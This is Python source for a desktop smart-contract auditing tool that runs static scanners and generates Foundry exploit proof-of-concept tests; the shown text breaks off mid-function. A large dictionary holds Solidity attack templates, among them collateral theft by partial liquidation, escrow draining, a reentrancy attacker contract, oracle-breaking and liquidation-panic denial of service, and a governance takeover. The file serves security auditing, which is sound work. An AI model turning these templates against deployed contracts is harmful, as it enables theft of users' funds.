import sys
import os
import subprocess
import json
from PyQt5.QtCore import QDir, QPoint, Qt
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QComboBox, QTextEdit, QFileDialog, QLabel, QSpacerItem, QSizePolicy, QInputDialog, QFormLayout, QGroupBox, QCheckBox, QTreeView, QFileSystemModel, QSplitter, QMenu, QMessageBox, QLineEdit, QScrollArea, QGridLayout, QTextBrowser, QDialog, QDialogButtonBox

import shlex
import html
from queue import Queue
import threading
from PyQt5.QtCore import QTimer
import re
import shutil
import toml
from datetime import datetime


try:
    from slither import Slither
    from slither.exceptions import SlitherError
except ImportError:
    print("Error: Py-Slither is not installed. Please run 'pip install slither-analyzer'.")
    sys.exit(1)

try:
    from exploit_db import EXPLOIT_TEMPLATES
except ImportError:
    print("Warning: exploit_db.py not found. Exploit generation will be limited.")
    EXPLOIT_TEMPLATES = {}


# =================================================================================
# TROPHY EXPLOIT DEFINITIONS
# =================================================================================
SIX_SHOOTER_TROPHIES = {
    "panic_dos": {
        "name": "The Panic DoS",
        "objective": "Prove a full liquidation causes an EVM panic (Arithmetic Error).",
        "roles": ['deposit', 'borrow', 'liquidate', 'getCreditLimit', 'setOracle', 'setPrice'],
        "code": """
    function test_Strategy0_ProveThePanic() public {
        console.log("\\n--- [ATTACK 1/6: The Panic DoS] ---");
        vm.prank(gov);
        {SET_ORACLE_CALL}
        vm.prank(gov);
        {SET_PRICE_CALL_LOW}
        {GET_CREDIT_LIMIT_ASSERTION}
        dola.mint(attacker, victimDebt);
        vm.startPrank(attacker);
        dola.approve(address(target), victimDebt);
        vm.expectRevert(stdError.arithmeticError);
        {LIQUIDATE_CALL}
        vm.stopPrank();
    }
"""
    },
    "salami_slice": {
        "name": "Salami Slice Theft",
        "objective": "Avoid panic by liquidating a small part of the debt to steal funds.",
        "roles": ['deposit', 'borrow', 'liquidate', 'getCreditLimit', 'setOracle', 'setPrice'],
        "code": """
    function test_Strategy1_SalamiSliceTheft() public {
        console.log("\\n--- [ATTACK 2/6: The Salami Slice Theft] ---");
        vm.prank(gov);
        {SET_ORACLE_CALL}
        vm.prank(gov);
        {SET_PRICE_CALL_MED}
        {GET_CREDIT_LIMIT_ASSERTION}
        uint partialRepayAmount = 1000 * 1e18;
        dola.mint(attacker, partialRepayAmount);
        vm.startPrank(attacker);
        dola.approve(address(target), partialRepayAmount);
        uint256 attackerInitialBalance = collateral.balanceOf(attacker);
        {LIQUIDATE_PARTIAL_CALL}
        uint256 attackerFinalBalance = collateral.balanceOf(attacker);
        vm.stopPrank();
        assertTrue(attackerFinalBalance > attackerInitialBalance, "Attacker should have stolen collateral");
        console.log("--> [SUCCESS] Attacker stole %d collateral via partial liquidation.", (attackerFinalBalance - attackerInitialBalance) / 1e18);
    }
"""
    },
    "griefing_freeze": {
        "name": "Griefing Freeze",
        "objective": "Block honest liquidators by front-running them to cause a panic.",
        "roles": ['deposit', 'borrow', 'liquidate', 'getCreditLimit', 'setOracle', 'setPrice'],
        "code": """
    function test_Strategy2_GriefingLiquidationFreeze() public {
        console.log("\\n--- [ATTACK 3/6: The Griefing Liquidation Freeze] ---");
        vm.prank(gov);
        {SET_ORACLE_CALL}
        vm.prank(gov);
        {SET_PRICE_CALL_LOW}
        {GET_CREDIT_LIMIT_ASSERTION}
        dola.mint(attacker, victimDebt);
        vm.startPrank(attacker);
        dola.approve(address(target), victimDebt);
        vm.expectRevert(stdError.arithmeticError);
        {LIQUIDATE_CALL}
        vm.stopPrank();
        console.log("--> [SUCCESS] Attacker successfully front-ran and caused a panic.");
    }
"""
    },
    "state_exhaustion": {
        "name": "State Exhaustion",
        "objective": "Create many dust accounts and trigger panic on each to leave broken state.",
        "roles": ['deposit'],
        "code": """
    function test_Strategy3_StateExhaustion() public {
        console.log("\\n--- [ATTACK 4/6: State Exhaustion DoS (Conceptual)] ---");
        address dustVictim = makeAddr("dustVictim");
        collateral.mint(dustVictim, 1 ether);
        vm.startPrank(dustVictim);
        collateral.approve(address(target), 1 ether);
        {DEPOSIT_DUST_CALL}
        vm.stopPrank();
        console.log("--> An attacker could create thousands of such dust accounts and panic them.");
    }
"""
    },
    "gov_bait_switch": {
        "name": "Governance Bait & Switch",
        "objective": "Use the panic as a pretext for a malicious governance upgrade.",
        "roles": ['setGov'],
        "code": """
    function test_Strategy4_GovernanceBaitAndSwitch() public {
        console.log("\\n--- [ATTACK 5/6: Governance Bait and Switch (Conceptual)] ---");
        vm.prank(gov);
        {SET_GOV_CALL}
        console.log("--> Attacker uses panic as pretext for DAO to approve malicious upgrade.");
        assertEq(target.gov(), attacker);
    }
"""
    },
    "cross_protocol": {
        "name": "Cross-Protocol Exploit",
        "objective": "Panic a function in an integrated protocol to create systemic risk.",
        "roles": [],
        "code": """
    function test_Strategy5_CrossProtocolExploitation() public {
        console.log("\\n--- [ATTACK 6/6: Cross-Protocol Exploitation (Conceptual)] ---");
        // This test is conceptual and requires a second protocol to be defined and integrated.
        // LendX lendX = new LendX(target);
        console.log("--> By panicking a key function, an attacker can create bad debt in an integrated protocol.");
    }
"""
    },
    "oracle_dos": {
        "name": "Oracle Dependency DoS",
        "objective": "Freeze liquidations by intentionally breaking a dependent oracle.",
        "roles": ['setOracle', 'liquidate', 'getCreditLimit'],
        "code": """
    function test_Strategy6_OracleDependencyDoS() public {
        console.log("\\n--- [ATTACK 7/7: Oracle Dependency DoS] ---");
        RevertingOracle revertingOracle = new RevertingOracle();
        vm.prank(gov);
        target.setOracle(revertingOracle);
        revertingOracle.setPrice(address(collateral), 0.7 ether);
        {GET_CREDIT_LIMIT_ASSERTION}
        vm.prank(attacker);
        revertingOracle.breakOracle();
        console.log("--> Attacker has broken the oracle.");
        dola.mint(attacker, victimDebt);
        vm.startPrank(attacker);
        dola.approve(address(target), victimDebt);
        vm.expectRevert("Oracle is broken");
        {LIQUIDATE_CALL}
        vm.stopPrank();
        console.log("--> [SUCCESS] Liquidation is frozen due to oracle dependency failure.");
    }
"""
    },
    "escrow_theft": {
        "name": "Direct Escrow Theft",
        "objective": "Directly call a vulnerable 'pay' function on an escrow to steal all collateral.",
        "roles": ['getEscrow', 'pay'],
        "code": """
    function test_Strategy7_DirectEscrowTheft() public {
        console.log("\\n--- [ATTACK 8/8: Direct Escrow Theft] ---");
        {GET_ESCROW_CALL}
        uint256 victimCollateral = victimEscrow.balance();
        assertTrue(victimCollateral > 0, "Victim should have collateral in escrow");
        uint256 attackerInitialBalance = collateral.balanceOf(attacker);
        console.log("--> Attacker is directly calling 'pay' on the victim's escrow contract...");
        vm.prank(attacker);
        {ESCROW_PAY_CALL}
        uint256 attackerFinalBalance = collateral.balanceOf(attacker);
        uint256 victimFinalCollateral = victimEscrow.balance();
        assertEq(victimFinalCollateral, 0, "Victim's escrow should be empty");
        assertEq(attackerFinalBalance, attackerInitialBalance + victimCollateral, "Attacker should have all the victim's collateral");
    }
"""
    },
    "reentrancy_double_dip": {
        "name": "Reentrancy (Double-Dip Refund)",
        "objective": "Exploit a reentrancy in a withdraw/cancel function to get multiple refunds for a single deposit.",
        "roles": ['createOrder', 'cancelOrder'], # The key functions we need to map
        "code": """
    // Attacker contract that re-enters the cancel function.
    contract Attacker {
        {TARGET_CONTRACT_NAME} public immutable target;
        bytes32 public orderId;
        uint public reenterCount = 0;
        address public owner;

        constructor(address _target) {
            target = {TARGET_CONTRACT_NAME}(_target);
            owner = msg.sender;
        }

        // 1. Attacker creates a legitimate order.
        // NOTE: The parameters for creating an order will need to be configured.
        function setupAttack(bytes memory orderData) public {
            // This part is highly specific to the target protocol (Beanstalk)
            // It would need to be adapted based on the createOrder function signature.
            (bool success, bytes memory returnData) = address(target).call(orderData);
            require(success, "Order creation failed");
            orderId = abi.decode(returnData, (bytes32));
        }

        // 2. Attacker starts the attack by calling the cancel function.
        function attack() public {
            target.{CANCEL_ORDER_CALL}(orderId);
        }

        // 3. This fallback is triggered by the target's `sendToken` call.
        receive() external payable {
            // Re-enter the cancel function a single time to double-dip.
            if (reenterCount < 1) {
                reenterCount++;
                target.{CANCEL_ORDER_CALL}(orderId);
            }
        }

        function getBalance() external view returns (uint) {
            return address(this).balance;
        }
    }

    function testExploit_ReentrancyDoubleDip() public {
        console.log("\\n--- [ATTACK: Re-entrancy Double-Dip] ---");

        // Setup: Deploy the attacker contract and create an order to be cancelled.
        Attacker attackerContract = new Attacker(address(target));

        // This setup is complex and protocol-specific. The user will need to
        // provide the correct parameters to create a valid order.
        // For demonstration, we assume a setupAttack function exists.
        // attackerContract.setupAttack(...);

        uint256 attackerBalanceBefore = address(attackerContract).balance;

        // Execute the attack
        attackerContract.attack();

        uint256 attackerBalanceAfter = address(attackerContract).balance;

        // Assert that the attacker's balance increased by more than one refund.
        // This proves the double-dip was successful.
        assertTrue(attackerBalanceAfter > (attackerBalanceBefore + 1 ether), "Attacker should have received more than one refund.");
        console.log("--> [SUCCESS] Attacker drained funds via double-dip reentrancy.");
    }
"""
    },
}

DYNAMIC_TROPHY_BOILERPLATE = """
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "{CONTRACT_FILE_NAME}";

// =================================================================================
// MOCK IMPLEMENTATIONS
// =================================================================================

interface MOCK_IERC20 {{
    function approve(address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
    function transferFrom(address, address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
    function mint(address to, uint amount) external;
    function allowance(address owner, address spender) external view returns (uint);
}}
interface MOCK_IOracle {{
    function getPrice(address,uint) external view returns (uint);
    function viewPrice(address,uint) external view returns (uint);
    function setPrice(address asset, uint256 newPrice) external;
}}
interface MOCK_IEscrowPoC {{
    function initialize(MOCK_IERC20 _token, address beneficiary) external;
    function pay(address recipient, uint amount) external;
    function balance() external view returns (uint);
}}

contract UnsafeToken is MOCK_IERC20 {{
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowances;
    function approve(address spender, uint amount) external returns(bool) {{ allowances[msg.sender][spender] = amount; return true; }}
    function transferFrom(address from, address to, uint amount) external returns(bool) {{ balances[from] -= amount; balances[to] += amount; return true; }}
    function transfer(address to, uint amount) external returns (bool) {{ balances[msg.sender] -= amount; balances[to] += amount; return true; }}
    function balanceOf(address owner) external view returns (uint) {{ return balances[owner]; }}
    function allowance(address, address) external view returns (uint) {{ return type(uint256).max; }}
    function mint(address to, uint amount) external {{ balances[to] += amount; }}
}}

contract ManipulatableOracle is MOCK_IOracle {{
    mapping(address => uint) public prices;
    function getPrice(address asset, uint) external view returns (uint) {{ return prices[asset]; }}
    function viewPrice(address asset, uint) external view returns (uint) {{ return prices[asset]; }}
    function setPrice(address asset, uint256 newPrice) external {{ prices[asset] = newPrice; }}
}}

contract RevertingOracle is MOCK_IOracle {{
    mapping(address => uint) public prices;
    bool public isBroken;
    function getPrice(address asset, uint) external view returns (uint) {{ require(!isBroken, "Oracle is broken"); return prices[asset]; }}
    function viewPrice(address asset, uint) external view returns (uint) {{ require(!isBroken, "Oracle is broken"); return prices[asset]; }}
    function setPrice(address asset, uint256 newPrice) external {{ prices[asset] = newPrice; }}
    function breakOracle() external {{ isBroken = true; }}
}}

contract DynamicTrophyTest is Test {{
    {TARGET_CONTRACT_NAME} public target;
    ManipulatableOracle public oracle;
    UnsafeToken public collateral;
    UnsafeToken public dola;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");
    address public gov = makeAddr("governor");

    uint public victimCollateralAmount = {VICTIM_COLLATERAL_AMOUNT};
    uint public victimDebt = {VICTIM_DEBT};

    function setUp() public {{
        collateral = new UnsafeToken();
        dola = new UnsafeToken();
        oracle = new ManipulatableOracle();

        {DEPLOY_TARGET_CONTRACT}

        collateral.mint(victim, victimCollateralAmount);
        dola.mint(address(target), 1_000_000 * 1e18);

        vm.startPrank(victim);
        collateral.approve(address(target), type(uint256).max);
        {SETUP_DEPOSIT_CALL}
        {SETUP_BORROW_CALL}
        vm.stopPrank();
    }}

    {TEST_FUNCTION_CODE}
}}
"""

class TrophyConfigDialog(QDialog):
    def __init__(self, target_name, contract_data, trophy_data, parent=None):
        super().__init__(parent)
        self.target_name = target_name
        self.contract_data = contract_data
        self.trophy_data = trophy_data
        self.setWindowTitle(f"Configure Trophy: {trophy_data['name']}")
        self.setMinimumWidth(600)

        self.layout = QVBoxLayout(self)

        file_io_layout = QHBoxLayout()
        load_button = QPushButton("Load Config")
        load_button.clicked.connect(self.load_from_file)
        save_button = QPushButton("Save Config")
        save_button.clicked.connect(self.save_to_file)
        file_io_layout.addWidget(load_button)
        file_io_layout.addWidget(save_button)
        self.layout.addLayout(file_io_layout)

        self.widgets = {}

        run_params_group = QGroupBox("Run Parameters")
        run_params_layout = QFormLayout()
        self.widgets['fork_url'] = QLineEdit("mainnet")
        run_params_layout.addRow("Fork URL/Alias:", self.widgets['fork_url'])
        run_params_group.setLayout(run_params_layout)
        self.layout.addWidget(run_params_group)

        constructor_group = QGroupBox("Constructor Arguments")
        constructor_layout = QFormLayout()
        constructor = next((f for f in contract_data['functions'] if f['name'] == 'constructor'), None)
        if constructor and constructor.get('parameters'):
            for i, param in enumerate(constructor['parameters']):
                label = f"{param.get('name', f'arg{i}')} ({param['type']})"
                self.widgets[f"constructor_{i}"] = QLineEdit()
                constructor_layout.addRow(label, self.widgets[f"constructor_{i}"])
        else:
            constructor_layout.addRow(QLabel("No constructor arguments detected."))
        constructor_group.setLayout(constructor_layout)
        self.layout.addWidget(constructor_group)

        roles_group = QGroupBox("Function Role Mapping")
        roles_layout = QFormLayout()
        all_funcs = [f['name'] for f in contract_data['functions'] if f['name'] != 'constructor']
        for role in trophy_data.get('roles', []):
            combo = QComboBox()
            combo.addItems(["<None>"] + all_funcs)
            guess = self._guess_function(role, all_funcs)
            if guess:
                combo.setCurrentText(guess)
            self.widgets[f"role_{role}"] = combo
            roles_layout.addRow(f"{role.replace('_', ' ').title()} Function:", self.widgets[f"role_{role}"])
        roles_group.setLayout(roles_layout)
        self.layout.addWidget(roles_group)

        params_group = QGroupBox("Test Parameters")
        params_layout = QFormLayout()
        self.widgets['victim_collateral'] = QLineEdit("15000 ether")
        self.widgets['victim_debt'] = QLineEdit("10000 ether")
        params_layout.addRow("Victim Collateral Amount:", self.widgets['victim_collateral'])
        params_layout.addRow("Victim Debt Amount:", self.widgets['victim_debt'])
        params_group.setLayout(params_layout)
        self.layout.addWidget(params_group)

        self.buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        self.buttons.accepted.connect(self.accept)
        self.buttons.rejected.connect(self.reject)
        self.layout.addWidget(self.buttons)

    def _guess_function(self, role, functions):
        role_synonyms = {
            'liquidate': ['liquidate', 'seize', 'liquidation'], 'deposit': ['deposit', 'supply', 'addcollateral'],
            'borrow': ['borrow', 'debt', 'mint', 'takeloan'], 'getescrow': ['getescrow', 'escrows'],
            'pay': ['pay', 'send', 'transfer'], 'getcreditlimit': ['getcreditlimit', 'creditlimit', 'healthfactor'],
            'setoracle': ['setoracle'], 'setprice': ['setprice'], 'setgov': ['setgov', 'setgovernance', 'setgovernor'],
            'createorder': ['create', 'order', 'list'], 'cancelorder': ['cancel', 'remove', 'delist']
        }
        for func in functions:
            for synonym in role_synonyms.get(role.lower(), [role.lower()]):
                if synonym in func.lower():
                    return func
        return None

    def get_values(self):
        values = {}
        for key, widget in self.widgets.items():
            if isinstance(widget, QLineEdit):
                values[key] = widget.text()
            elif isinstance(widget, QComboBox):
                values[key] = widget.currentText()
        return values

    def load_from_file(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Load Trophy Config", "", "JSON Files (*.json)")
        if not filename: return
        try:
            with open(filename, 'r') as f:
                config_data = json.load(f)

            for key, value in config_data.items():
                if key in self.widgets:
                    widget = self.widgets[key]
                    if isinstance(widget, QLineEdit):
                        widget.setText(str(value))
                    elif isinstance(widget, QComboBox):
                        index = widget.findText(str(value))
                        if index >= 0: widget.setCurrentIndex(index)
            QMessageBox.information(self, "Success", "Configuration loaded successfully.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load configuration file:\n{e}")

    def save_to_file(self):
        config_data = self.get_values()
        filename, _ = QFileDialog.getSaveFileName(self, "Save Trophy Config", "", "JSON Files (*.json)")
        if not filename: return
        try:
            with open(filename, 'w') as f:
                json.dump(config_data, f, indent=4)
            QMessageBox.information(self, "Success", f"Configuration saved to:\n{filename}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save configuration file:\n{e}")

class Application(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Smart Contract Vulnerability Scanner - The Six-Shooter")
        self.setGeometry(100, 100, 1800, 1000)

        self.setStyleSheet("""
            QWidget { background-color: #0d0d0d; color: #e0e0e0; font-family: 'monospace'; }
            QGroupBox { font-weight: bold; border: 1px solid #444; border-radius: 5px; margin-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top center; padding: 0 3px; }
            QPushButton { background-color: #333; border: 1px solid #555; padding: 5px; border-radius: 3px; }
            QPushButton:hover { background-color: #454545; }
            QPushButton:pressed { background-color: #222; }
            QComboBox, QLineEdit { background-color: #222; border: 1px solid #555; padding: 3px; }
            QTextEdit, QTextBrowser { background-color: #1a1a1a; border: 1px solid #555; }
        """)

        self.home_dir = os.path.expanduser('~')
        self.contract_map_data = {}
        self.slither_findings = []
        self.processed_slither_findings = []
        self.selected_project_path = None
        self.selected_contract = None
        self.terminal_queue = Queue()
        self.is_map_ready = False
        self.map_lock = threading.Lock()

        self.version_list = [f"0.{i}.{j}" for i in range(8, 3, -1) for j in range(27, -1, -1)]

        main_layout = QHBoxLayout(self)
        main_splitter = QSplitter(self)

        left_panel_widget = QWidget()
        self.left_panel_layout = QVBoxLayout()
        self.setup_left_panel()
        left_panel_widget.setLayout(self.left_panel_layout)
        main_splitter.addWidget(left_panel_widget)

        center_panel_scroll = QScrollArea()
        center_panel_scroll.setWidgetResizable(True)
        center_panel_widget = QWidget()
        self.right_panel_layout = QVBoxLayout()
        self.setup_right_panel()
        center_panel_widget.setLayout(self.right_panel_layout)
        center_panel_scroll.setWidget(center_panel_widget)
        main_splitter.addWidget(center_panel_scroll)

        terminal_group = QGroupBox("Unified Analysis Terminal")
        terminal_layout = QVBoxLayout()
        self.terminal_output = QTextBrowser(self)
        self.terminal_output.setReadOnly(True)
        self.terminal_output.setStyleSheet("background-color: #1a1a1a; color: #f0f0f0; font-family: 'monospace'; font-size: 10pt;")
        self.terminal_output.setOpenExternalLinks(True)
        terminal_layout.addWidget(self.terminal_output)

        terminal_button_layout = QHBoxLayout()
        self.copy_terminal_button = QPushButton("Copy to Clipboard")
        self.copy_terminal_button.clicked.connect(self.copy_terminal_output)
        terminal_button_layout.addWidget(self.copy_terminal_button)

        clear_terminal_button = QPushButton("Clear Terminal")
        clear_terminal_button.clicked.connect(self.terminal_output.clear)
        terminal_button_layout.addWidget(clear_terminal_button)
        terminal_layout.addLayout(terminal_button_layout)

        terminal_group.setLayout(terminal_layout)
        main_splitter.addWidget(terminal_group)

        main_splitter.setSizes([300, 480, 1020])
        main_layout.addWidget(main_splitter)
        self.setLayout(main_layout)

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_output)
        self.timer.start(100)

    def setup_left_panel(self):
        single_file_group = QGroupBox("Single File Analysis")
        single_file_layout = QVBoxLayout()

        solc_layout = QHBoxLayout()
        solc_layout.addWidget(QLabel("Solc Version:"))
        self.version_var = QComboBox(self)
        self.version_var.addItems(self.version_list)
        try:
            default_version_index = self.version_list.index("0.8.20")
            self.version_var.setCurrentIndex(default_version_index)
        except ValueError:
            self.version_var.setCurrentIndex(0)
        solc_layout.addWidget(self.version_var)
        single_file_layout.addLayout(solc_layout)

        self.change_button = QPushButton("Change Global Solc Version")
        self.change_button.setToolTip("Uses solc-select to change the active solc version.")
        self.change_button.clicked.connect(self.change_solc_version)
        single_file_layout.addWidget(self.change_button)

        self.select_button = QPushButton("Select Single Contract File")
        self.select_button.clicked.connect(self.select_contract)
        single_file_layout.addWidget(self.select_button)

        self.map_button = QPushButton("Generate Map (Single File)")
        self.map_button.setToolTip("Generates a contract map for the selected single file.")
        self.map_button.clicked.connect(self.generate_contract_map)
        single_file_layout.addWidget(self.map_button)

        single_file_group.setLayout(single_file_layout)
        self.left_panel_layout.addWidget(single_file_group)

        project_group = QGroupBox("Project Analysis")
        project_layout = QVBoxLayout()

        self.git_clone_button = QPushButton("Clone Project from Git URL")
        self.git_clone_button.setToolTip("Clones a Git repository to a local directory for analysis.")
        self.git_clone_button.clicked.connect(self.run_git_clone)
        project_layout.addWidget(self.git_clone_button)

        self.download_explorer_button = QPushButton("Download from Block Explorer")
        self.download_explorer_button.setToolTip("Instructions for downloading verified source code.")
        self.download_explorer_button.clicked.connect(self.show_download_instructions)
        project_layout.addWidget(self.download_explorer_button)

        self.select_project_button = QPushButton("Select Local Project")
        self.select_project_button.clicked.connect(self.select_project_folder)
        project_layout.addWidget(self.select_project_button)

        self.initialize_project_button = QPushButton("Initialize Foreign Project as Foundry")
        self.initialize_project_button.setToolTip("Converts a non-foundry project (e.g., Hardhat) into a workable Foundry project.")
        self.initialize_project_button.clicked.connect(self.initialize_foreign_project)
        project_layout.addWidget(self.initialize_project_button)

        self.forge_build_button = QPushButton("Build Project (forge build)")
        self.forge_build_button.setToolTip("Runs `forge build` to compile the project.")
        self.forge_build_button.clicked.connect(self.run_forge_build)
        project_layout.addWidget(self.forge_build_button)
        
        # --- New Report Button ---
        self.generate_report_button = QPushButton("Generate Full Report")
        self.generate_report_button.setToolTip("Runs Slither, Aderyn, and Wake, then combines the output into a single Markdown report.")
        self.generate_report_button.clicked.connect(self.generate_full_report)
        project_layout.addWidget(self.generate_report_button)
        # --- End New Button ---

        self.generate_project_map_button = QPushButton("Generate/Refresh Project Map")
        self.generate_project_map_button.clicked.connect(self.generate_contract_map)
        project_layout.addWidget(self.generate_project_map_button)

        detector_path_layout = QFormLayout()
        self.custom_detector_path_input = QLineEdit()
        self.custom_detector_path_input.setPlaceholderText("Optional: /path/to/custom_detectors")
        detector_path_layout.addRow("Custom Detector Path:", self.custom_detector_path_input)
        project_layout.addLayout(detector_path_layout)
        
        project_group.setLayout(project_layout)
        self.left_panel_layout.addWidget(project_group)
        
        other_scanners_group = QGroupBox("Other Static Scanners")
        other_scanners_layout = QVBoxLayout()
        
        self.run_slither_scan_button = QPushButton("Run Slither Scan")
        self.run_slither_scan_button.clicked.connect(self.run_slither_scan_only)
        other_scanners_layout.addWidget(self.run_slither_scan_button)

        self.scan_mythril_button = QPushButton("Scan with Mythril")
        self.scan_mythril_button.setToolTip("Runs Mythril on the selected single file.")
        self.scan_mythril_button.clicked.connect(self.run_mythril_scan)
        other_scanners_layout.addWidget(self.scan_mythril_button)

        self.scan_solcscan_button = QPushButton("Scan with Solcscan")
        self.scan_solcscan_button.setToolTip("Runs Solcscan on the selected single file.")
        self.scan_solcscan_button.clicked.connect(self.run_solcscan_scan)
        other_scanners_layout.addWidget(self.scan_solcscan_button)

        self.scan_falcon_button = QPushButton("Scan with Falcon")
        self.scan_falcon_button.setToolTip("Runs Falcon on the selected single file.")
        self.scan_falcon_button.clicked.connect(self.run_falcon_scan)
        other_scanners_layout.addWidget(self.scan_falcon_button)

        self.scan_wake_button = QPushButton("Scan with Wake")
        self.scan_wake_button.setToolTip("Runs Wake on the selected project.")
        self.scan_wake_button.clicked.connect(self.run_wake_scan)
        other_scanners_layout.addWidget(self.scan_wake_button)

        self.scan_aderyn_button = QPushButton("Scan with Aderyn")
        self.scan_aderyn_button.setToolTip("Runs Aderyn on the selected project.")
        self.scan_aderyn_button.clicked.connect(self.run_aderyn_scan)
        other_scanners_layout.addWidget(self.scan_aderyn_button)

        other_scanners_group.setLayout(other_scanners_layout)
        self.left_panel_layout.addWidget(other_scanners_group)

        forge_group = QGroupBox("Forge Commands")
        forge_layout = QVBoxLayout()

        self.forge_clean_button = QPushButton("Clean Project (forge clean)")
        self.forge_clean_button.setToolTip("Runs `forge clean` to remove build artifacts.")
        self.forge_clean_button.clicked.connect(self.run_forge_clean)
        forge_layout.addWidget(self.forge_clean_button)
        
        self.npm_install_button = QPushButton("Install Node.js Dependencies (npm/yarn)")
        self.npm_install_button.setToolTip("Runs `npm install` or `yarn install` for projects using Node.js dependencies.")
        self.npm_install_button.clicked.connect(self.run_npm_install)
        forge_layout.addWidget(self.npm_install_button)

        self.forge_install_button = QPushButton("Install Solidity Dependencies (forge install)")
        self.forge_install_button.setToolTip("Runs `forge install` to download dependencies for the selected project.")
        self.forge_install_button.clicked.connect(self.run_forge_install)
        forge_layout.addWidget(self.forge_install_button)

        test_controls_layout = QHBoxLayout()
        test_controls_layout.addWidget(QLabel("Verbosity:"))
        self.test_verbosity_dropdown = QComboBox()
        self.test_verbosity_dropdown.addItems(["Normal (-vv)", "Trace Failing (-vvv)", "Trace All (-vvvv)", "Deep Trace (-vvvvv)"])
        self.test_verbosity_dropdown.setCurrentIndex(1)
        test_controls_layout.addWidget(self.test_verbosity_dropdown)
        forge_layout.addLayout(test_controls_layout)

        self.run_tests_button = QPushButton("Run All Tests")
        self.run_tests_button.setToolTip("Run all tests in the project (`forge test`)")
        self.run_tests_button.clicked.connect(self.run_forge_tests_with_verbosity)
        forge_layout.addWidget(self.run_tests_button)

        self.debug_test_button = QPushButton("Debug Selected Test Function")
        self.debug_test_button.clicked.connect(self.debug_selected_test)
        forge_layout.addWidget(self.debug_test_button)

        self.view_remappings_button = QPushButton("View Remappings")
        self.view_remappings_button.setToolTip("Runs `forge remappings` to show project dependency paths.")
        self.view_remappings_button.clicked.connect(self.run_forge_remappings)
        forge_layout.addWidget(self.view_remappings_button)
        
        self.run_coverage_fixer_button = QPushButton("Run Coverage with Auto-Fix")
        self.run_coverage_fixer_button.setToolTip("Temporarily excludes incompatible contracts to run a coverage report, then restores original config.")
        self.run_coverage_fixer_button.clicked.connect(self.run_coverage_with_auto_fix)
        forge_layout.addWidget(self.run_coverage_fixer_button)

        forge_group.setLayout(forge_layout)
        self.left_panel_layout.addWidget(forge_group)

        self.left_panel_layout.addSpacerItem(QSpacerItem(20, 20, QSizePolicy.Minimum, QSizePolicy.Expanding))

    def setup_right_panel(self):
        trophy_group = QGroupBox("The Six-Shooter Trophies 🏆")
        trophy_layout = QGridLayout()

        row, col = 0, 0
        for key, trophy_data in SIX_SHOOTER_TROPHIES.items():
            button = QPushButton(trophy_data["name"])
            button.setToolTip(trophy_data["objective"])
            button.clicked.connect(lambda checked, t=trophy_data: self.open_trophy_config_dialog(t))
            trophy_layout.addWidget(button, row, col)
            col += 1
            if col > 1:
                col = 0
                row += 1

        trophy_group.setLayout(trophy_layout)
        self.right_panel_layout.addWidget(trophy_group)

        exploit_generation_group = QGroupBox("Exploit Generation (from Slither)")
        main_exploit_layout = QVBoxLayout()

        impact_filter_group = QGroupBox("Filter by Impact")
        impact_filter_layout = QHBoxLayout()
        self.impact_filter_dropdown = QComboBox()
        self.impact_filter_dropdown.addItems(["All", "Critical", "High", "Medium", "Low", "Informational"])
        self.impact_filter_dropdown.currentIndexChanged.connect(self.filter_and_update_slither_dropdown)
        impact_filter_layout.addWidget(self.impact_filter_dropdown)
        impact_filter_group.setLayout(impact_filter_layout)
        main_exploit_layout.addWidget(impact_filter_group)

        slither_group = QGroupBox("Slither Vulnerabilities Found")
        slither_group_layout = QVBoxLayout()
        self.slither_vuln_dropdown = QComboBox()
        self.slither_vuln_dropdown.setEnabled(False)
        self.slither_vuln_dropdown.currentIndexChanged.connect(self.on_vulnerability_selected)
        slither_group_layout.addWidget(self.slither_vuln_dropdown)
        slither_group.setLayout(slither_group_layout)
        main_exploit_layout.addWidget(slither_group)

        exploit_params_group = QGroupBox("Parameters")
        exploit_layout = QFormLayout()
        self.exploit_param_widgets = {}
        self.exploit_params_layout = QFormLayout()
        exploit_layout.addRow(self.exploit_params_layout)
        self.function_params_layout = QFormLayout()
        exploit_layout.addRow(self.function_params_layout)
        exploit_params_group.setLayout(exploit_layout)
        main_exploit_layout.addWidget(exploit_params_group)

        self.generate_exploit_button = QPushButton("Generate Exploit PoC")
        self.generate_exploit_button.setToolTip("Generates a Foundry test file for the selected Slither finding.")
        self.generate_exploit_button.clicked.connect(self.generate_slither_exploit)
        main_exploit_layout.addWidget(self.generate_exploit_button)

        exploit_generation_group.setLayout(main_exploit_layout)
        self.right_panel_layout.addWidget(exploit_generation_group)

        explorer_group = QGroupBox("Project Explorer")
        explorer_layout = QVBoxLayout()
        self.fs_model = QFileSystemModel()
        self.fs_model.setRootPath(QDir.rootPath())
        self.file_explorer = QTreeView()
        self.file_explorer.setModel(self.fs_model)
        self.file_explorer.setRootIndex(self.fs_model.index(self.home_dir))
        self.file_explorer.setColumnWidth(0, 250)
        self.file_explorer.doubleClicked.connect(self.on_file_explorer_activated)
        self.file_explorer.setContextMenuPolicy(Qt.CustomContextMenu)
        self.file_explorer.customContextMenuRequested.connect(self.explorer_context_menu)
        explorer_layout.addWidget(self.file_explorer)
        explorer_group.setLayout(explorer_layout)
        self.right_panel_layout.addWidget(explorer_group, 1)
        self.right_panel_layout.addStretch()

    def generate_full_report(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>Please select a project folder first to generate a report.</span>")
            return
        
        self.clear_output()
        threading.Thread(target=self._generate_full_report_thread, daemon=True).start()
        
    def _generate_full_report_thread(self):
        project_root = self.get_project_root()
        project_name = os.path.basename(project_root)
        report_path = os.path.join(project_root, 'Full_Security_Report.md')
        
        self.terminal_queue.put(f"<b>🚀 Starting Full Report Generation for {project_name}...</b>")
        
        report_content = []
